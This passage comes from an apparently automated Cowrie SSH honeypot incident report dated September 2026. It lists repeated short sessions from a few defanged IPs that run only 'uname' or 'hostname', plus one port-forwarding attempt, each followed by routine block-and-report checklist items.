| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:42:57` | `cowrie.session.connect` |
| `2026-09-07 19:42:57` | `cowrie.client.version` |
| `2026-09-07 19:42:57` | `cowrie.client.kex` |
| `2026-09-07 19:42:57` | `cowrie.login.success` |
| `2026-09-07 19:42:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.30.68[.]202` to AbuseIPDB if not already reported
- [ ] Block `177.30.68[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b3f581b92e4

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:43 |
| **Last Seen** | 2026-09-07 19:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:43:13` | `cowrie.session.connect` |
| `2026-09-07 19:43:14` | `cowrie.client.version` |
| `2026-09-07 19:43:14` | `cowrie.client.kex` |
| `2026-09-07 19:43:16` | `cowrie.login.success` |
| `2026-09-07 19:43:18` | `cowrie.session.params` |
| `2026-09-07 19:43:18` | `cowrie.command.input` |
| `2026-09-07 19:43:18` | `cowrie.log.closed` |
| `2026-09-07 19:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd59f53e4809

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:43 |
| **Last Seen** | 2026-09-07 19:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:43:48` | `cowrie.session.connect` |
| `2026-09-07 19:43:48` | `cowrie.client.version` |
| `2026-09-07 19:43:48` | `cowrie.client.kex` |
| `2026-09-07 19:43:51` | `cowrie.login.success` |
| `2026-09-07 19:43:52` | `cowrie.session.params` |
| `2026-09-07 19:43:52` | `cowrie.command.input` |
| `2026-09-07 19:43:53` | `cowrie.log.closed` |
| `2026-09-07 19:43:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d0b145a5e48

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:44 |
| **Last Seen** | 2026-09-07 19:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:44:20` | `cowrie.session.connect` |
| `2026-09-07 19:44:21` | `cowrie.client.version` |
| `2026-09-07 19:44:21` | `cowrie.client.kex` |
| `2026-09-07 19:44:23` | `cowrie.login.success` |
| `2026-09-07 19:44:25` | `cowrie.session.params` |
| `2026-09-07 19:44:25` | `cowrie.command.input` |
| `2026-09-07 19:44:26` | `cowrie.log.closed` |
| `2026-09-07 19:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee870a39712

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:44 |
| **Last Seen** | 2026-09-07 19:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:44:52` | `cowrie.session.connect` |
| `2026-09-07 19:44:52` | `cowrie.client.version` |
| `2026-09-07 19:44:52` | `cowrie.client.kex` |
| `2026-09-07 19:44:54` | `cowrie.login.success` |
| `2026-09-07 19:44:56` | `cowrie.session.params` |
| `2026-09-07 19:44:56` | `cowrie.command.input` |
| `2026-09-07 19:44:57` | `cowrie.log.closed` |
| `2026-09-07 19:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-992c22f1c006

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:45 |
| **Last Seen** | 2026-09-07 19:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:45:22` | `cowrie.session.connect` |
| `2026-09-07 19:45:23` | `cowrie.client.version` |
| `2026-09-07 19:45:23` | `cowrie.client.kex` |
| `2026-09-07 19:45:25` | `cowrie.login.success` |
| `2026-09-07 19:45:27` | `cowrie.session.params` |
| `2026-09-07 19:45:27` | `cowrie.command.input` |
| `2026-09-07 19:45:28` | `cowrie.log.closed` |
| `2026-09-07 19:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-543604540ecd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-07 19:45 |
| **Last Seen** | 2026-09-07 19:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:45:40` | `cowrie.session.connect` |
| `2026-09-07 19:45:40` | `cowrie.client.version` |
| `2026-09-07 19:45:40` | `cowrie.client.kex` |
| `2026-09-07 19:45:40` | `cowrie.login.success` |
| `2026-09-07 19:45:40` | `cowrie.direct-tcpip.request` |
| `2026-09-07 19:45:40` | `cowrie.direct-tcpip.data` |
| `2026-09-07 19:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ea76c043248

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:45 |
| **Last Seen** | 2026-09-07 19:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:45:52` | `cowrie.session.connect` |
| `2026-09-07 19:45:53` | `cowrie.client.version` |
| `2026-09-07 19:45:53` | `cowrie.client.kex` |
| `2026-09-07 19:45:55` | `cowrie.login.success` |
| `2026-09-07 19:45:57` | `cowrie.session.params` |
| `2026-09-07 19:45:57` | `cowrie.command.input` |
| `2026-09-07 19:45:58` | `cowrie.log.closed` |
| `2026-09-07 19:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73d82d2b5be1

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:46 |
| **Last Seen** | 2026-09-07 19:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:46:22` | `cowrie.session.connect` |
| `2026-09-07 19:46:22` | `cowrie.client.version` |
| `2026-09-07 19:46:22` | `cowrie.client.kex` |
| `2026-09-07 19:46:24` | `cowrie.login.success` |
| `2026-09-07 19:46:26` | `cowrie.session.params` |
| `2026-09-07 19:46:26` | `cowrie.command.input` |
| `2026-09-07 19:46:27` | `cowrie.log.closed` |
| `2026-09-07 19:46:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65af459442a8

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:46 |
| **Last Seen** | 2026-09-07 19:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:46:51` | `cowrie.session.connect` |
| `2026-09-07 19:46:51` | `cowrie.client.version` |
| `2026-09-07 19:46:51` | `cowrie.client.kex` |
| `2026-09-07 19:46:54` | `cowrie.login.success` |
| `2026-09-07 19:46:56` | `cowrie.session.params` |
| `2026-09-07 19:46:56` | `cowrie.command.input` |
| `2026-09-07 19:46:56` | `cowrie.log.closed` |
| `2026-09-07 19:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a15d635447d9

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:47 |
| **Last Seen** | 2026-09-07 19:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:47:20` | `cowrie.session.connect` |
| `2026-09-07 19:47:21` | `cowrie.client.version` |
| `2026-09-07 19:47:21` | `cowrie.client.kex` |
| `2026-09-07 19:47:23` | `cowrie.login.success` |
| `2026-09-07 19:47:25` | `cowrie.session.params` |
| `2026-09-07 19:47:25` | `cowrie.command.input` |
| `2026-09-07 19:47:26` | `cowrie.log.closed` |
| `2026-09-07 19:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67f5bcbee2bb

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:47 |
| **Last Seen** | 2026-09-07 19:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:47:50` | `cowrie.session.connect` |
| `2026-09-07 19:47:50` | `cowrie.client.version` |
| `2026-09-07 19:47:50` | `cowrie.client.kex` |
| `2026-09-07 19:47:53` | `cowrie.login.success` |
| `2026-09-07 19:47:54` | `cowrie.session.params` |
| `2026-09-07 19:47:54` | `cowrie.command.input` |
| `2026-09-07 19:47:55` | `cowrie.log.closed` |
| `2026-09-07 19:47:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb7f1c3daff0

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:48 |
| **Last Seen** | 2026-09-07 19:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:48:19` | `cowrie.session.connect` |
| `2026-09-07 19:48:20` | `cowrie.client.version` |
| `2026-09-07 19:48:20` | `cowrie.client.kex` |
| `2026-09-07 19:48:22` | `cowrie.login.success` |
| `2026-09-07 19:48:24` | `cowrie.session.params` |
| `2026-09-07 19:48:24` | `cowrie.command.input` |
| `2026-09-07 19:48:24` | `cowrie.log.closed` |
| `2026-09-07 19:48:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f453964d3e4

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:48 |
| **Last Seen** | 2026-09-07 19:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:48:48` | `cowrie.session.connect` |
| `2026-09-07 19:48:49` | `cowrie.client.version` |
| `2026-09-07 19:48:49` | `cowrie.client.kex` |
| `2026-09-07 19:48:51` | `cowrie.login.success` |
| `2026-09-07 19:48:53` | `cowrie.session.params` |
| `2026-09-07 19:48:53` | `cowrie.command.input` |
| `2026-09-07 19:48:54` | `cowrie.log.closed` |
| `2026-09-07 19:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1081ee647575

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:49 |
| **Last Seen** | 2026-09-07 19:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:49:18` | `cowrie.session.connect` |
| `2026-09-07 19:49:18` | `cowrie.client.version` |
| `2026-09-07 19:49:18` | `cowrie.client.kex` |
| `2026-09-07 19:49:20` | `cowrie.login.success` |
| `2026-09-07 19:49:22` | `cowrie.session.params` |
| `2026-09-07 19:49:22` | `cowrie.command.input` |
| `2026-09-07 19:49:23` | `cowrie.log.closed` |
| `2026-09-07 19:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe4d9d72ecb6

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:49 |
| **Last Seen** | 2026-09-07 19:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:49:34` | `cowrie.session.connect` |
| `2026-09-07 19:49:34` | `cowrie.client.version` |
| `2026-09-07 19:49:34` | `cowrie.client.kex` |
| `2026-09-07 19:49:36` | `cowrie.login.success` |
| `2026-09-07 19:49:37` | `cowrie.session.params` |
| `2026-09-07 19:49:37` | `cowrie.command.input` |
| `2026-09-07 19:49:37` | `cowrie.log.closed` |
| `2026-09-07 19:49:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e266817a0281

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:49 |
| **Last Seen** | 2026-09-07 19:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:49:40` | `cowrie.session.connect` |
| `2026-09-07 19:49:40` | `cowrie.client.version` |
| `2026-09-07 19:49:40` | `cowrie.client.kex` |
| `2026-09-07 19:49:41` | `cowrie.login.success` |
| `2026-09-07 19:49:43` | `cowrie.session.params` |
| `2026-09-07 19:49:43` | `cowrie.command.input` |
| `2026-09-07 19:49:43` | `cowrie.log.closed` |
| `2026-09-07 19:49:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-675cc63d1a7d

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:49 |
| **Last Seen** | 2026-09-07 19:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:49:44` | `cowrie.session.connect` |
| `2026-09-07 19:49:44` | `cowrie.client.version` |
| `2026-09-07 19:49:44` | `cowrie.client.kex` |
| `2026-09-07 19:49:46` | `cowrie.login.success` |
| `2026-09-07 19:49:47` | `cowrie.session.params` |
| `2026-09-07 19:49:47` | `cowrie.command.input` |
| `2026-09-07 19:49:48` | `cowrie.log.closed` |
| `2026-09-07 19:49:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1cbdcdfd22a

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:49 |
| **Last Seen** | 2026-09-07 19:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:49:47` | `cowrie.session.connect` |
| `2026-09-07 19:49:47` | `cowrie.client.version` |
| `2026-09-07 19:49:48` | `cowrie.client.kex` |
| `2026-09-07 19:49:50` | `cowrie.login.success` |
| `2026-09-07 19:49:51` | `cowrie.session.params` |
| `2026-09-07 19:49:51` | `cowrie.command.input` |
| `2026-09-07 19:49:52` | `cowrie.log.closed` |
| `2026-09-07 19:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16129adf8d5a

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:49 |
| **Last Seen** | 2026-09-07 19:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:49:48` | `cowrie.session.connect` |
| `2026-09-07 19:49:48` | `cowrie.client.version` |
| `2026-09-07 19:49:48` | `cowrie.client.kex` |
| `2026-09-07 19:49:49` | `cowrie.login.success` |
| `2026-09-07 19:49:50` | `cowrie.session.params` |
| `2026-09-07 19:49:50` | `cowrie.command.input` |
| `2026-09-07 19:49:50` | `cowrie.log.closed` |
| `2026-09-07 19:49:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8021579e31c1

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:49 |
| **Last Seen** | 2026-09-07 19:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:49:51` | `cowrie.session.connect` |
| `2026-09-07 19:49:51` | `cowrie.client.version` |
| `2026-09-07 19:49:51` | `cowrie.client.kex` |
| `2026-09-07 19:49:52` | `cowrie.login.success` |
| `2026-09-07 19:49:53` | `cowrie.session.params` |
| `2026-09-07 19:49:53` | `cowrie.command.input` |
| `2026-09-07 19:49:53` | `cowrie.log.closed` |
| `2026-09-07 19:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa8584698c9a

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:49 |
| **Last Seen** | 2026-09-07 19:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:49:54` | `cowrie.session.connect` |
| `2026-09-07 19:49:54` | `cowrie.client.version` |
| `2026-09-07 19:49:54` | `cowrie.client.kex` |
| `2026-09-07 19:49:56` | `cowrie.login.success` |
| `2026-09-07 19:49:57` | `cowrie.session.params` |
| `2026-09-07 19:49:57` | `cowrie.command.input` |
| `2026-09-07 19:49:57` | `cowrie.log.closed` |
| `2026-09-07 19:49:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac2a666a3f7c

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:49 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:49:58` | `cowrie.session.connect` |
| `2026-09-07 19:49:58` | `cowrie.client.version` |
| `2026-09-07 19:49:58` | `cowrie.client.kex` |
| `2026-09-07 19:49:59` | `cowrie.login.success` |
| `2026-09-07 19:50:00` | `cowrie.session.params` |
| `2026-09-07 19:50:00` | `cowrie.command.input` |
| `2026-09-07 19:50:00` | `cowrie.log.closed` |
| `2026-09-07 19:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54a6d8e51df5

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:01` | `cowrie.session.connect` |
| `2026-09-07 19:50:01` | `cowrie.client.version` |
| `2026-09-07 19:50:01` | `cowrie.client.kex` |
| `2026-09-07 19:50:02` | `cowrie.login.success` |
| `2026-09-07 19:50:03` | `cowrie.session.params` |
| `2026-09-07 19:50:03` | `cowrie.command.input` |
| `2026-09-07 19:50:03` | `cowrie.log.closed` |
| `2026-09-07 19:50:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-881df200ca2b

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:03` | `cowrie.session.connect` |
| `2026-09-07 19:50:03` | `cowrie.client.version` |
| `2026-09-07 19:50:04` | `cowrie.client.kex` |
| `2026-09-07 19:50:05` | `cowrie.login.success` |
| `2026-09-07 19:50:06` | `cowrie.session.params` |
| `2026-09-07 19:50:06` | `cowrie.command.input` |
| `2026-09-07 19:50:06` | `cowrie.log.closed` |
| `2026-09-07 19:50:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6b4b784a7d3

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:07` | `cowrie.session.connect` |
| `2026-09-07 19:50:07` | `cowrie.client.version` |
| `2026-09-07 19:50:07` | `cowrie.client.kex` |
| `2026-09-07 19:50:09` | `cowrie.login.success` |
| `2026-09-07 19:50:10` | `cowrie.session.params` |
| `2026-09-07 19:50:10` | `cowrie.command.input` |
| `2026-09-07 19:50:10` | `cowrie.log.closed` |
| `2026-09-07 19:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91bedfeb80f4

| Field | Detail |
|---|---|
